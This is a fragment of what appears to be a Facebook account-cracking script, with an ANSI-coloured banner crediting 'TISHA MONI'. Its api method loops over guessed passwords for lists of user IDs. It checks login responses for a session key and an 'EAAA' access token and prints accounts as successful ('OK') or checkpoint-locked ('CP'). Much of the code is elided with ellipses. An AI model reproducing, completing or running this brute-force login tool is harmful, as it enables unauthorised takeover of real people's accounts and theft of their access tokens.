...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : TISHA MONI
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : UNKNOWN  
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : TISHA MONI
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [TISHA] : %s/%s -> \033[0;92m [ TISHA-OK:%s ]- \033[0;91m[TISHA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [TISHA-CP] %s | %s\033[0;97m         "%(uid, pw))
